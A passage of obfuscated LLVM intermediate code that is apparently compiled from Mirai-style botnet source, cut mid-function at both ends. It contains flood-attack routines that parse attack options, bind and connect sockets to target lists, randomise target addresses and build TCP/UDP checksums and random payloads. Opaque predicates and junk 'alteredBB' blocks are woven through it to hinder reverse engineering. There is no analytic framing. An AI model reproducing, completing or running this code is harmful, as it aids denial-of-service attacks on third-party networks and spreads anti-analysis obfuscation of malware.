  %327 = bitcast i8* %326 to i32*
  store i32* %327, i32** %308, align 8
  %328 = load i8, i8* %304, align 1
  %329 = load %struct.attack_option*, %struct.attack_option** %305, align 8
  %330 = call i32 @attack_get_opt_int(i8 zeroext %328, %struct.attack_option* %329, i8 zeroext 7, i32 65535)
  %331 = trunc i32 %330 to i16
  store i16 %331, i16* %309, align 2
  %332 = load i8, i8* %304, align 1
  %333 = load %struct.attack_option*, %struct.attack_option** %305, align 8
  %334 = call i32 @attack_get_opt_int(i8 zeroext %332, %struct.attack_option* %333, i8 zeroext 6, i32 65535)
  %335 = trunc i32 %334 to i16
  store i16 %335, i16* %310, align 2
  %336 = load i8, i8* %304, align 1
  %337 = load %struct.attack_option*, %struct.attack_option** %305, align 8
  %338 = call i32 @attack_get_opt_int(i8 zeroext %336, %struct.attack_option* %337, i8 zeroext 0, i32 512)
  %339 = trunc i32 %338 to i16
  store i16 %339, i16* %311, align 2
  %340 = load i8, i8* %304, align 1
  %341 = load %struct.attack_option*, %struct.attack_option** %305, align 8
  %342 = call i32 @attack_get_opt_int(i8 zeroext %340, %struct.attack_option* %341, i8 zeroext 1, i32 1)
  %343 = trunc i32 %342 to i8
  store i8 %343, i8* %312, align 1
  %344 = bitcast %struct.sockaddr_in* %313 to i8*
  call void @llvm.memset.p0i8.i64(i8* %344, i8 0, i64 16, i32 4, i1 false)
  %345 = load i16, i16* %310, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %114
  %348 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 0
  store i16 2, i16* %348, align 4
  %349 = load i16, i16* %21, align 2
  %350 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %349, i16* %350, align 2
  %351 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %352 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %351, i32 0, i32 0
  store i32 0, i32* %352, align 4
  %353 = load i32*, i32** %19, align 8
  %354 = load i32, i32* %17, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds i32, i32* %353, i64 %355
  %357 = load i32, i32* %356, align 4
  %358 = bitcast %union.__CONST_SOCKADDR_ARG* %28 to %struct.sockaddr**
  %359 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  store %struct.sockaddr* %359, %struct.sockaddr** %358, align 8
  %360 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %28, i32 0, i32 0
  %361 = load %struct.sockaddr*, %struct.sockaddr** %360, align 8
  %362 = call i32 @bind(i32 %357, %struct.sockaddr* %361, i32 16) #6
  %363 = icmp eq i32 %362, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %157
  %364 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %365 = load i32, i32* %17, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 1
  %369 = load i32, i32* %368, align 4
  %370 = call i32 @ntohl(i32 %369) #7
  %371 = call i32 @rand_next()
  %372 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %373 = load i32, i32* %17, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %372, i64 %374
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i32 0, i32 2
  %377 = load i8, i8* %376, align 4
  %378 = zext i8 %377 to i32
  %_ = sub i32 %371, %378
  %gen = mul i32 %_, %378
  %_7 = shl i32 %371, %378
  %379 = lshr i32 %371, %378
  %_8 = sub i32 %370, %379
  %gen9 = mul i32 %_8, %379
  %_10 = sub i32 %370, %379
  %gen11 = mul i32 %_10, %379
  %_12 = sub i32 0, %370
  %gen13 = add i32 %_12, %379
  %_14 = sub i32 0, %370
  %gen15 = add i32 %_14, %379
  %380 = add i32 %370, %379
  %381 = call i32 @htonl(i32 %380) #7
  %382 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %383 = load i32, i32* %17, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i64 %384
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %385, i32 0, i32 0
  %387 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %386, i32 0, i32 2
  %388 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %387, i32 0, i32 0
  store i32 %381, i32* %388, align 4
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %199
  %389 = load i32*, i32** %19, align 8
  %390 = load i32, i32* %17, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds i32, i32* %389, i64 %391
  %393 = load i32, i32* %392, align 4
  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %396 = load i32, i32* %17, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i32 @connect(i32 %393, %struct.sockaddr* %402, i32 16)
  %404 = icmp eq i32 %403, -1
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %238
  store i32 0, i32* %17, align 4
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %282
  %405 = load i32, i32* %17, align 4
  %_28 = sub i32 0, %405
  %gen29 = add i32 %_28, 1
  %_30 = sub i32 %405, 1
  %gen31 = mul i32 %_30, 1
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %17, align 4
  br label %originalBB27
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = load i32, i32* @x.43
  %4 = load i32, i32* @y.44
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.43
  %15 = load i32, i32* @y.44
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %32, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp ugt i32 %23, 1
  br i1 %24, label %25, label %35

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  br label %32

; <label>:32:                                     ; preds = %25
  %33 = load i32, i32* %12, align 4
  %34 = sub i32 %33, 2
  store i32 %34, i32* %12, align 4
  br label %22

; <label>:35:                                     ; preds = %22
  %36 = load i32, i32* %12, align 4
  %37 = icmp eq i32 %36, 1
  br i1 %37, label %38, label %45

; <label>:38:                                     ; preds = %35
  %39 = load i16*, i16** %11, align 8
  %40 = load i16, i16* %39, align 2
  %41 = trunc i16 %40 to i8
  %42 = sext i8 %41 to i64
  %43 = load i64, i64* %13, align 8
  %44 = add i64 %43, %42
  store i64 %44, i64* %13, align 8
  br label %45

; <label>:45:                                     ; preds = %38, %35
  %46 = load i32, i32* @x.43
  %47 = load i32, i32* @y.44
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i64, i64* %13, align 8
  %55 = lshr i64 %54, 16
  %56 = load i64, i64* %13, align 8
  %57 = and i64 %56, 65535
  %58 = add i64 %55, %57
  store i64 %58, i64* %13, align 8
  %59 = load i64, i64* %13, align 8
  %60 = lshr i64 %59, 16
  %61 = load i64, i64* %13, align 8
  %62 = add i64 %61, %60
  store i64 %62, i64* %13, align 8
  %63 = load i64, i64* %13, align 8
  %64 = xor i64 %63, -1
  %65 = trunc i64 %64 to i16
  %66 = load i32, i32* @x.43
  %67 = load i32, i32* @y.44
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart247, label %originalBB1alteredBB

originalBBpart247:                                ; preds = %originalBB1
  ret i16 %65

originalBBalteredBB:                              ; preds = %originalBB, %2
  %74 = alloca i16*, align 8
  %75 = alloca i32, align 4
  %76 = alloca i64, align 8
  store i16* %0, i16** %74, align 8
  store i32 %1, i32* %75, align 4
  store i64 0, i64* %76, align 8
  store i64 0, i64* %76, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %77 = load i64, i64* %13, align 8
  %_ = shl i64 %77, 16
  %_2 = shl i64 %77, 16
  %_3 = sub i64 %77, 16
  %gen = mul i64 %_3, 16
  %_4 = shl i64 %77, 16
  %_5 = shl i64 %77, 16
  %_6 = sub i64 %77, 16
  %gen7 = mul i64 %_6, 16
  %_8 = shl i64 %77, 16
  %78 = lshr i64 %77, 16
  %79 = load i64, i64* %13, align 8
  %_9 = shl i64 %79, 65535
  %_10 = shl i64 %79, 65535
  %_11 = sub i64 %79, 65535
  %gen12 = mul i64 %_11, 65535
  %_13 = shl i64 %79, 65535
  %_14 = sub i64 %79, 65535
  %gen15 = mul i64 %_14, 65535
  %80 = and i64 %79, 65535
  %_16 = sub i64 0, %78
  %gen17 = add i64 %_16, %80
  %_18 = sub i64 %78, %80
  %gen19 = mul i64 %_18, %80
  %_20 = shl i64 %78, %80
  %_21 = sub i64 0, %78
  %gen22 = add i64 %_21, %80
  %_23 = sub i64 %78, %80
  %gen24 = mul i64 %_23, %80
  %_25 = sub i64 0, %78
  %gen26 = add i64 %_25, %80
  %_27 = sub i64 %78, %80
  %gen28 = mul i64 %_27, %80
  %_29 = sub i64 0, %78
  %gen30 = add i64 %_29, %80
  %81 = add i64 %78, %80
  store i64 %81, i64* %13, align 8
  %82 = load i64, i64* %13, align 8
  %_31 = shl i64 %82, 16
  %_32 = shl i64 %82, 16
  %_33 = shl i64 %82, 16
  %83 = lshr i64 %82, 16
  %84 = load i64, i64* %13, align 8
  %_34 = sub i64 %84, %83
  %gen35 = mul i64 %_34, %83
  %_36 = shl i64 %84, %83
  %_37 = sub i64 0, %84
  %gen38 = add i64 %_37, %83
  %_39 = sub i64 0, %84
  %gen40 = add i64 %_39, %83
  %_41 = shl i64 %84, %83
  %_42 = sub i64 0, %84
  %gen43 = add i64 %_42, %83
  %85 = add i64 %84, %83
  store i64 %85, i64* %13, align 8
  %86 = load i64, i64* %13, align 8
  %_44 = sub i64 0, %86
  %gen45 = add i64 %_44, -1
  %87 = xor i64 %86, -1
  %88 = trunc i64 %87 to i16
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 zeroext %68) #7
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

; <label>:77:                                     ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* @x.45
  %89 = load i32, i32* @y.46
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %87
  %96 = load i32, i32* %12, align 4
  %97 = xor i32 %96, -1
  %98 = trunc i32 %97 to i16
  %99 = load i32, i32* @x.45
  %100 = load i32, i32* @y.46
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %98

originalBBalteredBB:                              ; preds = %originalBB, %87
  %107 = load i32, i32* %12, align 4
  %_ = shl i32 %107, -1
  %_1 = sub i32 0, %107
  %gen = add i32 %_1, -1
  %_2 = sub i32 0, %107
  %gen3 = add i32 %_2, -1
  %108 = xor i32 %107, -1
  %109 = trunc i32 %108 to i16
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.49
  %4 = load i32, i32* @y.50
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* @x.49
  %14 = load i32, i32* @y.50
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %21

; <label>:21:                                     ; preds = %93, %originalBBpart2
  %22 = load i32, i32* %12, align 4
  %23 = icmp sgt i32 %22, 0
  br i1 %23, label %24, label %94

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* %12, align 4
  %26 = icmp sge i32 %25, 4
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %24
  %28 = load i32, i32* @x.49
  %29 = load i32, i32* @y.50
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = call i32 @rand_next()
  %37 = load i8*, i8** %11, align 8
  %38 = bitcast i8* %37 to i32*
  store i32 %36, i32* %38, align 4
  %39 = load i8*, i8** %11, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 4
  store i8* %40, i8** %11, align 8
  %41 = load i32, i32* %12, align 4
  %42 = sext i32 %41 to i64
  %43 = sub i64 %42, 4
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* %12, align 4
  %45 = load i32, i32* @x.49
  %46 = load i32, i32* @y.50
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart211, label %originalBB1alteredBB

originalBBpart211:                                ; preds = %originalBB1
  br label %93

; <label>:53:                                     ; preds = %24
  %54 = load i32, i32* %12, align 4
  %55 = icmp sge i32 %54, 2
  br i1 %55, label %56, label %68

; <label>:56:                                     ; preds = %53
  %57 = call i32 @rand_next()
  %58 = and i32 %57, 65535
  %59 = trunc i32 %58 to i16
  %60 = load i8*, i8** %11, align 8
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = load i8*, i8** %11, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  store i8* %63, i8** %11, align 8
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 2
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %12, align 4
  br label %92

; <label>:68:                                     ; preds = %53
  %69 = load i32, i32* @x.49
  %70 = load i32, i32* @y.50
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %68
  %77 = call i32 @rand_next()
  %78 = and i32 %77, 255
  %79 = trunc i32 %78 to i8
  %80 = load i8*, i8** %11, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %11, align 8
  store i8 %79, i8* %80, align 1
  %82 = load i32, i32* %12, align 4
  %83 = add nsw i32 %82, -1
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* @x.49
  %85 = load i32, i32* @y.50
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart223, label %originalBB13alteredBB

originalBBpart223:                                ; preds = %originalBB13
  br label %92

; <label>:92:                                     ; preds = %originalBBpart223, %56
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart211
  br label %21

; <label>:94:                                     ; preds = %21
  %95 = load i32, i32* @x.49
  %96 = load i32, i32* @y.50
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %94
  %103 = load i32, i32* @x.49
  %104 = load i32, i32* @y.50
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %111 = alloca i8*, align 8
  %112 = alloca i32, align 4
  store i8* %0, i8** %111, align 8
  store i32 %1, i32* %112, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %113 = call i32 @rand_next()
  %114 = load i8*, i8** %11, align 8
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  %116 = load i8*, i8** %11, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 4
  store i8* %117, i8** %11, align 8
  %118 = load i32, i32* %12, align 4
  %119 = sext i32 %118 to i64
  %_ = sub i64 %119, 4
  %gen = mul i64 %_, 4
  %_2 = sub i64 0, %119
  %gen3 = add i64 %_2, 4
  %_4 = sub i64 %119, 4
  %gen5 = mul i64 %_4, 4
  %_6 = sub i64 %119, 4
  %gen7 = mul i64 %_6, 4
  %_8 = sub i64 0, %119
  %gen9 = add i64 %_8, 4
  %120 = sub i64 %119, 4
  %121 = trunc i64 %120 to i32
  store i32 %121, i32* %12, align 4
  br label %originalBB1

originalBB13alteredBB:                            ; preds = %originalBB13, %68
  %122 = call i32 @rand_next()
  %_14 = sub i32 %122, 255
  %gen15 = mul i32 %_14, 255
  %123 = and i32 %122, 255
  %124 = trunc i32 %123 to i8
  %125 = load i8*, i8** %11, align 8
  %126 = getelementptr inbounds i8, i8* %125, i32 1
  store i8* %126, i8** %11, align 8
  store i8 %124, i8* %125, align 1
  %127 = load i32, i32* %12, align 4
  %_16 = shl i32 %127, -1
  %_17 = shl i32 %127, -1
  %_18 = sub i32 %127, -1
  %gen19 = mul i32 %_18, -1
  %_20 = sub i32 %127, -1
  %gen21 = mul i32 %_20, -1
  %128 = add nsw i32 %127, -1
  store i32 %128, i32* %12, align 4
  br label %originalBB13

originalBB25alteredBB:                            ; preds = %originalBB25, %94
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 28, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.51
  %18 = load i32, i32* @y.52
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %45, %originalBBpart2
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %12, align 4
  %35 = add nsw i32 %34, -1
  store i32 %35, i32* %12, align 4
  %36 = icmp ne i32 %34, 0
  %37 = load i32, i32* @x.51
  %38 = load i32, i32* @y.52
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart25, label %originalBB1alteredBB

originalBBpart25:                                 ; preds = %originalBB1
  br i1 %36, label %45, label %55

; <label>:45:                                     ; preds = %originalBBpart25
  %46 = call i32 @rand_next()
  %47 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %48 = call i32 @util_strlen(i8* %47)
  %49 = urem i32 %46, %48
  %50 = zext i32 %49 to i64
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %11, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %11, align 8
  store i8 %52, i8* %53, align 1
  br label %25

; <label>:55:                                     ; preds = %originalBBpart25
  call void @table_lock_val(i8 zeroext 28)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %56 = alloca i8*, align 8
  %57 = alloca i32, align 4
  %58 = alloca [32 x i8], align 16
  store i8* %0, i8** %56, align 8
  store i32 %1, i32* %57, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %58, i32 0, i32 0
  %60 = call i8* @table_retrieve_val(i32 28, i32* null)
  %61 = call i8* @strcpy(i8* %59, i8* %60) #6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %62 = load i32, i32* %12, align 4
  %_ = sub i32 0, %62
  %gen = add i32 %_, -1
  %_2 = sub i32 0, %62
  %gen3 = add i32 %_2, -1
  %63 = add nsw i32 %62, -1
